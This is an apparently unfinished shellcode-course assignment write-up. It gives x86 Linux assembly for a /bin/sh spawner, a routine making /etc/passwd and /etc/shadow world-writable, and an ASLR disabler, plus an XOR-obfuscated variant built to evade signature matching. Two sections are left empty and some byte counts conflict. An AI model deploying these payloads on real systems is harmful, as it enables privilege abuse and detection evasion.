# SLAE course
This course can be found here:
[Link to course](https://www.pentesteracademy.com/course?id=3)

## Assignment#6: What to do ?
For this assignment we have to:
* Take up to 3 shellcodes from Shell-Storm and create polymorphic versions of them to beat pattern matching.
* The polymorphic version cannot be larger 150% of the existing shellcode. 

Bonus points:
* Making the shellcode shorter than the original.

Now, let's get to work.
=

## 1) First shellcode: execve shellcode
* Original length: 23 bytes
* Polymorphic length: 33 bytes (increase of 30%)
* Source: http://shell-storm.org/shellcode/files/shellcode-827.php

### The original version:
```asm
;Shellcode size : 23 bytes
global _start

_start:
    xor eax, eax            ;initialize eax to NULL
    push eax                ;push NULL on the stack
    
    push 0x68732f2f     
    push 0x6e69622f         ;push /bin/sh
    mov ebx, esp            ;intialize ebx to "/bin/sh%00"

    push eax                ;Push NULL on the stack
    push ebx                ;Push '/bin/sh%00' on the stack
    mov ecx, esp            ;intialize ecx to "/bin/sh%00"

    mov al, 0xb             ;move the systemcall number 

    ;Systemcall details:
    ; --> execve("/bin/sh%00", ["/bin/sh%00", NULL], NULL)
    int 0x80                ;execute systemcall
```

### The polymophic version:
```asm
;Shellcode size: 33 bytes
global _start

_start:
    xor eax, eax            ;initialize eax to NULL
    push eax                ;Push NULL on the stack
    
    mov edx, 0xb6de91c0     ;Move 0xb6de91c0 into edx 
    xor edx, 0xdeadbeef     ;Xor 0xb6de91c0 with 0xdeadbeef
    push edx                ;Push '//sh' on the stack
    push 0x6e69622f         ;Push '/bin' on the stack
    mov ebx, esp            ;Initilialize ebx to "/bin/sh%00"

    push 0x1                ;Push 0x1 on the stack
    pop ecx                 ;Pop 0x1 inside ecx
    dec ecx                 ;dec ecx by one
    xor edx, edx            ;initialize edx to NULL

    push 0xb                ;Push 0xb on the stack
    pop eax                 ;Pop the execve systemcall number inside eax 

    ;Systemcall details:
    ; --> execve("/bin/sh%00", NULL, NULL)
    int 0x80                ;execute systemcall
```

## 2) Second shellcode: change "/etc/shadow" permissions shellcode
* Original length: 57 bytes
* Polymorphic length: XX bytes (increase of XX%)
* Source: http://shell-storm.org/shellcode/files/shellcode-812.php

### The original version:
```asm
;Shellcode size : 57 bytes
global _start

_start:
    xor eax, eax        ;Initialize eax to NULL
    mov cx, 0x1b6       ;Move 0x1b6 inside cx (666 in octal)
    push eax            ;Push a NULL byte on the stack 
    push 0x64777373
    push 0x61702f2f
    push 0x6374652f     ;Push "/etc//passwd%00" on the stack
    mov ebx, esp        ;Initialize ebx to the esp stack pointer
    mov al, 0xf         ;move the systemcall number inside eax

    ;Systemcall details:
    ; --> chmod("/etc/passwd%00", 0666o)
    int 0x80            ;execute systemcall

    xor eax, eax        ;Initialize eax to NULL
    push eax            ;Push a NULL byte on the stack 
    push 0x776f6461
    push 0x68732f2f
    push 0x6374652f     ;Push "/etc//shadow%00" on the stack
    mov ebx, esp        ;Initialize ebx to the esp stack pointer
    mov al, 0xf         ;move the systemcall number inside eax


    ;Systemcall details:
    ; --> chmod("/etc/shadow%00", 0666o)
    int 0x80            ;execute systemcall


    xor eax, eax        ;Initialize eax to NULL
    inc eax             ;move the systemcall number inside eax
    ;Systemcall details:
    ; --> exit(0)
    int 0x80            ;exit(0)
```

### The polymophic version:
```asm
```


## 3) Third shellcode: ASLR desactivation shellcode
* Original length: 57 bytes
* Polymorphic length: XX bytes (increase of XX%)
* Source: http://shell-storm.org/shellcode/files/shellcode-813.php

### The original version:
```asm
;Shellcode size : 83 bytes
global _start

_start:
    xor eax, eax        ;Initialize eax to NULL
    push eax            ;Push NULL on the stack
    push 0x65636170
    push 0x735f6176
    push 0x5f657a69
    push 0x6d6f646e
    push 0x61722f6c
    push 0x656e7265
    push 0x6b2f7379
    push 0x732f636f
    push 0x72702f2f     ;Push //proc/sys/kernel/randomize_va_space
    mov ebx, esp        ;Initialize ebx to "//proc/sys/kernel/randomize_va_space%00"
    mov cx, 0x2bc       ;Move 0x2bc on the stack which is 700 in decimal 
                        ;700 means the file is opened with READ, WRITE, EXECUTE flags.
    mov al, 0x8         ;Initialize al to systemcall number of "open"

    ;Systemcall details:
    ; --> fd = open("//proc/sys/kernel/randomize_va_space%00", S_IRWXU)
    int 0x80            ;Execute systemcall


    mov ebx, eax        ;Move the return value of "open" which is the file descriptor inside ebx
    push eax            ;Push the file descriptor on the stack
    mov dx, 0x3a30      ;Move 0x3a30 into edx
    push dx             ;push 0x3a30 on the stack
    mov ecx, esp        ;initialize ecx to stack pointer esp
    xor edx, edx        ;Initialize edx to NULL
    inc edx             ;Increment edx 
    mov al, 0x4         ;Initialize al to systemcall number of "write"

    ;Systemcall details:
    ; --> write(3, "0", 1)
    int 0x80            ;Execute systemcall


    mov al, 0x6         ;Initialize al to systemcall number of "close"
    ;Systemcall details:
    ; --> close(3)
    int 0x80            ;Execute systemcall


    xor eax, eax        ;Initialize al to systemcall number of "exit"
    xor ebx, ebx        ;Initiliaze ebx to NULL
    ;Systemcall details:
    ; --> exit(0)
    int 0x80            ;Execute systemcall
```

### The polymophic version:
```asm
```